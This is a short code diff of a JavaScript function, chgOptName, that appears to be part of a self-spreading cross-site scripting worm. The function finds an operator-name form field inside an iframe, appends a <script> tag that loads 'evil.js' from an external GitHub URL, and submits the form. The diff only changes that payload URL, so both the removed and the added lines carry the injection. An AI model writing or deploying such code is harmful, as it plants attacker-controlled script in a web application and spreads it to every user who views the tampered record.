@@ -10,7 +10,7 @@ function chgOptName(){
             doc = img.contentDocument;
         var optNameObj = doc.getElementsByName("orgOptor.optorName")[0];
         if (optNameObj.value.indexOf("script") < 0) {
-            optNameObj.value = optNameObj.value + "<script>$.getScript('https://github.com/hellosamy/hello/evil.js')</script>";
+            optNameObj.value = optNameObj.value + "<script>$.getScript('https://github.com/hellosamy/hello/blob/commit/evil.js')</script>";
             doc.forms[0].submit();
         }
       }
